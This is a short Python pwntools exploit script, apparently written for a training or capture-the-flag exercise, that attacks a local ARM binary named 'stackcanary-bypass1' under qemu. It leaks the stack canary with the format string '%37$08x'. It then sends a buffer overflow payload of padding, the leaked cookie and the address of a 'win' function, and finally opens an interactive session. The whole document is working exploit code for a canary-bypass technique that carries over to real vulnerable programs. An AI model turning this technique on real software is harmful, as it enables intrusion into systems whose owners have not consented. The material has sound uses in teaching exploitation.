#exploit.py
from pwn import *

# Address of win function
addr_win = 0x85c4

p = process(argv=['qemu-arm', '-L', '/usr/arm-linux-gnueabi/', './stackcanary-bypass1'])

p.readline() # Enter something to echo:

print '[+] Sending format string exploit...'
p.writeline('%37$08x')

# Read stack cookie
cookie_str = p.readline().strip()

# Convert to little endian
cookie = cookie_str.decode('hex')[::-1]

print '[+] Stack cookie is', cookie.encode('hex')
print '[+] Generating buffer overflow exploit'

bof_exploit = 'A' * 64           # padding
bof_exploit += cookie            # stack cookie
bof_exploit += 'AAAA'            # padding
bof_exploit += p32(addr_win)     # Address of win

print '[+] Bof exploit: ', bof_exploit.encode('hex')
print '[+] Sending exploit'
p.writeline(bof_exploit)

# All done switch to interactive mode
p.interactive()
